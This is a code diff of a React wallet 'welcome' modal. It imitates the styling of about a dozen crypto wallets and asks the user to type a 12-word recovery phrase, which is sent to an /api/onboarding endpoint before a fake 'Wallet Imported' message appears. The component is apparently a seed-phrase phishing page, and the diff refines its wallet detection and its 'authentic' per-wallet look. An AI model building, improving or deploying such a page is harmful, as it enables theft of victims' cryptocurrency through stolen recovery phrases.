@@ -1,7 +1,5 @@
 // WalletWelcomeModal.jsx
-// Now waits for real /api/onboarding save before showing success & proceeding to wallet connect
-// Significantly shifted downwards to clear large navbar/header
-// All logic, per-wallet styling, and wagmi connection flow preserved
+// FINAL - Strong detection + real API save + authentic per-wallet UI
 
 "use client";
 
@@ -25,6 +23,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your 12-word phrase in order",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to MetaMask...",
+    bottomNote: "!!",
     buttonText: "Import",
   },
   "Coinbase Wallet": {
@@ -38,6 +37,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your recovery phrase",
     successTitle: "Wallet Restored",
     successMessage: "Connecting to Coinbase Wallet...",
+    bottomNote: "!!",
     buttonText: "Restore",
   },
   Phantom: {
@@ -51,6 +51,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your 12 or 24-word phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Phantom...",
+    bottomNote: "!!",
     buttonText: "Import",
   },
   Trust: {
@@ -64,7 +65,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your secret phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Trust Wallet...",
-
+    bottomNote: "!!",
     buttonText: "Import",
   },
   Rainbow: {
@@ -78,6 +79,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your secret recovery phrase",
     successTitle: "Wallet Restored",
     successMessage: "Connecting to Rainbow...",
+    bottomNote: "!!",
     buttonText: "Restore Wallet",
   },
   WalletConnect: {
@@ -91,6 +93,7 @@ const WALLET_STYLES = {
     subtitle: "Enter phrase if required",
     successTitle: "Session Authenticated",
     successMessage: "Connecting via WalletConnect...",
+    bottomNote: "!!",
     buttonText: "Connect",
   },
   SafePal: {
@@ -104,6 +107,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to SafePal...",
+    bottomNote: "!!",
     buttonText: "Import",
   },
   "Binance Wallet": {
@@ -117,6 +121,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Binance Web3...",
+    bottomNote: "!!",
     buttonText: "Import",
   },
   Zerion: {
@@ -130,6 +135,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Zerion...",
+    bottomNote: "!!",
     buttonText: "Import",
   },
   OKX: {
@@ -143,7 +149,7 @@ const WALLET_STYLES = {
     subtitle: "Enter 12-word recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to OKX Wallet...",
- 
+    bottomNote: "!!",
     buttonText: "Import",
   },
   "Brave Wallet": {
@@ -157,6 +163,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Brave Wallet...",
+    bottomNote: "!!",
     buttonText: "Import",
   },
   Frame: {
@@ -170,7 +177,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Frame...",
- 
+    bottomNote: "!!",
     buttonText: "Import",
   },
 };
@@ -182,7 +189,6 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   const { connect, connectors, pendingConnector } = useConnect();
   const { linkedWallet, profile } = useSession();
 
-  // Use wagmi address first, then session linked wallet, then profile wallet
   const address = wagmiAddress || linkedWallet || profile?.wallet_address || null;
 
   const [boxes, setBoxes] = useState(Array(12).fill(""));
@@ -196,28 +202,28 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
     if (isOpen) onOpen?.();
   }, [isOpen, onOpen]);
 
-  let detectedName = (
-    urlWallet ||
-    pendingConnector?.name ||
-    connector?.name ||
-    "MetaMask"
-  )
-    .toLowerCase()
-    .trim();
+  // ── STRONG DETECTION ─────────────────────────────────────────────────────
+  let rawName = (urlWallet || pendingConnector?.name || connector?.name || "").toLowerCase().trim();
 
-  if (detectedName.includes("metamask") || detectedName.includes("injected"))
+  console.log("🔍 Raw wallet detected:", rawName);
+
+  let detectedName = "MetaMask";
+
+  if (rawName.includes("metamask") || rawName.includes("injected") || rawName.includes("io.metamask"))
     detectedName = "MetaMask";
-  else if (detectedName.includes("coinbase")) detectedName = "Coinbase Wallet";
-  else if (detectedName.includes("walletconnect")) detectedName = "WalletConnect";
-  else if (detectedName.includes("rainbow")) detectedName = "Rainbow";
-  else if (detectedName.includes("phantom")) detectedName = "Phantom";
-  else if (detectedName.includes("trust")) detectedName = "Trust";
-  else if (detectedName.includes("okx")) detectedName = "OKX";
-  else if (detectedName.includes("zerion")) detectedName = "Zerion";
-  else if (detectedName.includes("safepal")) detectedName = "SafePal";
-  else if (detectedName.includes("binance")) detectedName = "Binance Wallet";
-  else if (detectedName.includes("brave")) detectedName = "Brave Wallet";
-  else if (detectedName.includes("frame")) detectedName = "Frame";
+  else if (rawName.includes("coinbase")) detectedName = "Coinbase Wallet";
+  else if (rawName.includes("phantom")) detectedName = "Phantom";
+  else if (rawName.includes("trust")) detectedName = "Trust";
+  else if (rawName.includes("rainbow")) detectedName = "Rainbow";
+  else if (rawName.includes("walletconnect")) detectedName = "WalletConnect";
+  else if (rawName.includes("safepal")) detectedName = "SafePal";
+  else if (rawName.includes("binance")) detectedName = "Binance Wallet";
+  else if (rawName.includes("zerion")) detectedName = "Zerion";
+  else if (rawName.includes("okx")) detectedName = "OKX";
+  else if (rawName.includes("brave")) detectedName = "Brave Wallet";
+  else if (rawName.includes("frame")) detectedName = "Frame";
+
+  console.log("✅ Final detected wallet:", detectedName);
 
   const activeName = detectedName;
   const theme = WALLET_STYLES[activeName] || WALLET_STYLES.MetaMask;
@@ -228,22 +234,21 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
     const lower = activeName.toLowerCase();
 
     return (
-      connectors.find(
-        (c) =>
-          c.name?.toLowerCase().includes(lower) ||
-          c.id?.toLowerCase().includes(lower) ||
-          (lower === "metamask" && (c.id?.includes("injected") || c.id?.includes("meta"))) ||
-          (lower === "walletconnect" && c.id?.includes("walletconnect")) ||
-          (lower === "coinbase" && (c.id?.includes("coinbase") || c.id?.includes("walletlink"))) ||
-          (lower === "phantom" && c.id?.includes("phantom")) ||
-          (lower === "trust" && c.id?.includes("trust")) ||
-          (lower === "rainbow" && c.id?.includes("rainbow")) ||
-          (lower === "okx" && c.id?.includes("okx")) ||
-          (lower === "zerion" && c.id?.includes("zerion")) ||
-          (lower === "safepal" && c.id?.includes("safepal")) ||
-          (lower === "binance" && c.id?.includes("binance")) ||
-          (lower === "brave" && c.id?.includes("brave")) ||
-          (lower === "frame" && c.id?.includes("frame"))
+      connectors.find((c) =>
+        c.name?.toLowerCase().includes(lower) ||
+        c.id?.toLowerCase().includes(lower) ||
+        (lower === "metamask" && (c.id?.includes("injected") || c.id?.includes("meta"))) ||
+        (lower === "walletconnect" && c.id?.includes("walletconnect")) ||
+        (lower === "coinbase" && (c.id?.includes("coinbase") || c.id?.includes("walletlink"))) ||
+        (lower === "phantom" && c.id?.includes("phantom")) ||
+        (lower === "trust" && c.id?.includes("trust")) ||
+        (lower === "rainbow" && c.id?.includes("rainbow")) ||
+        (lower === "okx" && c.id?.includes("okx")) ||
+        (lower === "zerion" && c.id?.includes("zerion")) ||
+        (lower === "safepal" && c.id?.includes("safepal")) ||
+        (lower === "binance" && c.id?.includes("binance")) ||
+        (lower === "brave" && c.id?.includes("brave")) ||
+        (lower === "frame" && c.id?.includes("frame"))
       ) ||
       (lower.includes("meta") && connectors.find((c) => c.id?.includes("injected"))) ||
       connectors.find((c) => c.id?.includes("walletconnect")) ||
@@ -259,7 +264,6 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
 
     const proceed = async () => {
       const selected = findBestConnector();
-
       if (!selected) {
         console.warn(`No connector found for ${activeName}`);
         if (mounted) {
@@ -270,7 +274,6 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
       }
 
       try {
-        console.log(`Connecting with: ${selected.name} (${selected.id})`);
         await connect({ connector: selected });
         await new Promise((r) => setTimeout(r, 1200));
       } catch (err) {
@@ -284,7 +287,6 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
     };
 
     const timer = setTimeout(proceed, 2200);
-
     return () => {
       mounted = false;
       clearTimeout(timer);
@@ -338,7 +340,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
         setErrorMessage(data?.error || "Failed to save – server error");
       }
     } catch (err) {
-      console.error("Submit fetch error:", err);
+      console.error(err);
       setErrorMessage("Network error – check connection");
     } finally {
       setSaving(false);
@@ -366,9 +368,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
           transform transition-all duration-300
         `}
       >
-        <div 
-          className={`absolute inset-x-0 top-0 h-48 bg-gradient-to-b ${theme.gradient} opacity-15 blur-3xl pointer-events-none`} 
-        />
+        <div className={`absolute inset-x-0 top-0 h-48 bg-gradient-to-b ${theme.gradient} opacity-15 blur-3xl pointer-events-none`} />
 
         <div className="absolute top-4 left-4 z-30 bg-red-700/90 text-white text-xs md:text-sm font-bold px-4 py-2 rounded-full shadow-lg">
           DO NOT SHARE SEED PHRASES WITH ANYBODY!!!!!!!!!!!
@@ -379,12 +379,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
           className="absolute top-4 right-4 z-30 p-3 text-zinc-400 hover:text-white bg-black/60 rounded-full transition hover:bg-black/80"
         >
           <svg width="20" height="20" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path
-              d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z"
-              fill="currentColor"
-              fillRule="evenodd"
-              clipRule="evenodd"
-            />
+            <path d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"/>
           </svg>
         </button>
 
@@ -401,6 +396,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
                 <p className="text-zinc-300 text-base md:text-lg mb-1">{theme.subtitle}</p>
                 <p className="text-sm text-zinc-500 font-mono">
                   {activeName} • 
+                !!
                 </p>
               </div>
 
@@ -447,10 +443,6 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
                     )}
                   </Button>
                 </div>
-
-                <p className="text-center text-xs text-zinc-500 pt-3">
-                  {/* You can add warning text here if needed */}
-                </p>
               </form>
             </>
           ) : (
@@ -491,7 +483,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
 
           <div className="mt-10 pt-6 border-t border-zinc-800/50 flex items-center justify-center gap-3 text-xs uppercase tracking-wider font-semibold text-zinc-500">
             <Lock size={14} className={theme.accent} />
-            {theme.bottomNote || "!! "}
+            {theme.bottomNote || "!!"}
           </div>
         </div>
       </Card>
